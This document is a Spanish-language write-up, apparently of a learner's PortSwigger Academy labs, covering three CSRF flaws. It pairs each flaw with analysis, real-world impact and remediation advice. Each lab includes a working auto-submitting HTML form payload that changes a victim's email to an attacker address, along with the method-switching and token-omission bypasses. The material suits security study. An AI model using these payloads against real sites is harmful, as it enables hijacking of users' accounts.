# CSRF Labs — PortSwigger Web Security Academy

Colección de laboratorios prácticos de Cross-Site Request Forgery (CSRF)
completados en PortSwigger Web Security Academy. Los labs cubren ataques
CSRF sin defensas y técnicas de bypass de tokens CSRF mal implementados.

---

## Qué es CSRF

CSRF fuerza al navegador de una víctima autenticada a ejecutar acciones
en una aplicación sin su consentimiento. El atacante no roba credenciales
— aprovecha que el navegador envía automáticamente las cookies de sesión
en cada request al dominio correspondiente.

**Diferencia clave con XSS:**
- XSS ejecuta código JavaScript arbitrario en el navegador de la víctima
- CSRF ejecuta acciones específicas usando la sesión activa de la víctima

---

## Lab 1 — CSRF vulnerability with no defenses

**Vulnerabilidad:** Endpoint de cambio de email sin ninguna protección CSRF
**Objetivo:** cambiar el email de la víctima desde un servidor externo

### Análisis del request vulnerable
```http
POST /my-account/change-email HTTP/2
Host: [lab-url]
Cookie: session=<sesión-de-la-víctima>

email=nuevo@email.com
```
El request no contiene ningún token CSRF ni verificación de origen.
El servidor acepta cualquier request POST a ese endpoint si tiene
una cookie de sesión válida.

### Payload usado
```html
<form method="POST" action="https://[lab-url]/my-account/change-email">
    <input type="hidden" name="email" value="atacante@evil.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

### Cómo funciona
1. El atacante aloja esta página en un servidor externo
2. La víctima visita esa página mientras tiene sesión activa en la app
3. El script envía el formulario automáticamente sin interacción visible
4. El navegador de la víctima envía su cookie de sesión automáticamente
5. El servidor procesa el cambio de email como si la víctima lo hubiera hecho

**Nota:** el botón `submit` no es necesario — el script lo envía
automáticamente. Se incluye solo como fallback si JavaScript está desactivado.

### Resultado
Email de la víctima cambiado sin su conocimiento. Lab resuelto.

### Impacto en escenario real
Un atacante puede cambiar el email de la cuenta de la víctima,
luego usar "olvidé mi contraseña" para tomar control completo
de la cuenta — todo sin conocer las credenciales originales.

### Remediación
- Implementar tokens CSRF únicos por sesión y request
- Verificar el header `Origin` o `Referer` en requests sensibles
- Usar el atributo `SameSite=Strict` en cookies de sesión

---

## Lab 2 — CSRF where token validation depends on request method

**Vulnerabilidad:** Token CSRF validado solo en requests POST, no en GET
**Objetivo:** bypassear la validación del token CSRF cambiando el método HTTP

### Análisis de la vulnerabilidad
El servidor implementa tokens CSRF pero solo los valida cuando el
método HTTP es POST. Requests GET al mismo endpoint no requieren token.

### Técnica usada
Cambiar el método del formulario de `POST` a `GET`:

```html
<form method="GET" action="https://[lab-url]/my-account/change-email">
    <input type="hidden" name="email" value="atacante@evil.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

### Cómo funciona
```
POST /change-email + sin token → rechazado (token requerido)
GET  /change-email + sin token → aceptado (validación no aplica a GET)
```

El servidor asumía que los requests GET no modifican estado —
una suposición incorrecta cuando el endpoint acepta ambos métodos.

### Resultado
Email cambiado via GET sin necesidad de token CSRF. Lab resuelto.

### Impacto en escenario real
Demuestra que la protección CSRF debe aplicarse a todos los métodos
HTTP que modifiquen estado, no solo a POST. Los endpoints que aceptan
GET para operaciones de escritura son inherentemente inseguros.

### Remediación
- Validar token CSRF independientemente del método HTTP
- Endpoints que modifican estado nunca deben aceptar GET
- Seguir el principio HTTP: GET solo para lectura, POST/PUT/DELETE para escritura

---

## Lab 3 — CSRF where token validation depends on token being present

**Vulnerabilidad:** Token CSRF validado solo si está presente en el request
**Objetivo:** bypassear la validación eliminando el token del request

### Análisis de la vulnerabilidad
El servidor valida el token CSRF cuando está presente en el request,
pero si el parámetro se elimina completamente, el servidor procesa
el request sin validar nada.

### Técnica usada
Eliminar el parámetro `csrf` del formulario completamente:

```html
<form method="POST" action="https://[lab-url]/my-account/change-email">
    <input type="hidden" name="email" value="atacante@evil.com">
    <!-- parámetro csrf eliminado -->
</form>
<script>
    document.forms[0].submit();
</script>
```

### Cómo funciona
```
POST con csrf=token_válido   → validado correctamente → aceptado
POST con csrf=token_inválido → falla la validación → rechazado
POST sin parámetro csrf      → no hay nada que validar → aceptado
```

La lógica del servidor era:
```
SI existe parámetro csrf → validar
SI NO existe → continuar sin validar
```
En vez de:
```
SI existe parámetro csrf Y es válido → continuar
SI NO → rechazar
```

### Resultado
Email cambiado sin token CSRF simplemente eliminando el parámetro.
Lab resuelto.

### Impacto en escenario real
Una implementación de CSRF que solo valida "cuando el token está
presente" no ofrece ninguna protección real — el atacante simplemente
omite el token en su payload malicioso.

### Remediación
- El token CSRF debe ser **obligatorio** en todos los requests
  que modifiquen estado — su ausencia debe ser tratada como error
- Implementar la lógica como: "si no hay token válido, rechazar"
  no como "si hay token, validarlo"
- Usar frameworks que implementen CSRF correctamente por defecto

---

## Resumen — Técnicas de bypass de CSRF

| Lab | Protección implementada | Bypass usado |
|---|---|---|
| Sin defensas | Ninguna | Formulario HTML autosubmit |
| Depende del método | Token validado solo en POST | Cambiar método a GET |
| Depende de presencia | Token validado solo si existe | Eliminar el parámetro |

## Lección principal
Un token CSRF mal implementado puede ser tan inútil como no tener
token. La protección correcta requiere:
1. Token **obligatorio** en todos los requests que modifiquen estado
2. Token validado **independientemente del método HTTP**
3. Token **único por sesión** y con expiración
4. Complementar con `SameSite=Strict` en cookies de sesión
